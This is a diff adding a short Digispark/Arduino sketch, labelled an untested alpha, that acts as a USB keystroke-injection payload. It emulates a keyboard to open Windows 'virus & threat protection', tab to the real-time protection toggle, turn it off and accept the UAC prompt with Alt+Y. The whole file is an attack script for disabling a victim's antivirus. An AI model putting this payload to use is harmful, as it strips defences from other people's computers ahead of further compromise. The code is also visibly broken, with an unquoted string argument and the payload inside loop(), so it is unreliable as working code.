@@ -1,0 +1,29 @@
+/*
+    --- Disable Real Time Protection (Windows) ---
+    --- Made by Gerlach ---
+    --- https://github.com/Blubberdique ---
+    --- !! UNTESTED ALPHA VERSION !! ---
+*/
+
+#include "DigiKeyboard.h"
+#define KEY_TAB 0x2B
+#define KEY_L_ALT 0xE2
+
+void setup() {
+    // Left empty for now.
+}
+
+void loop() {
+
+    DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT);
+    DigiKeyboard.print(virus & threat protection);
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.sendKeyStroke(KEY_TAB);
+    DigiKeyboard.sendKeyStroke(KEY_TAB);
+    DigiKeyboard.sendKeyStroke(KEY_TAB);
+    DigiKeyboard.sendKeyStroke(KEY_TAB);
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.sendKeyStroke(KEY_SPACE);
+    DigiKeyboard.sendKeyStroke(KEY_L_ALT , KEY_Y);
+
+}
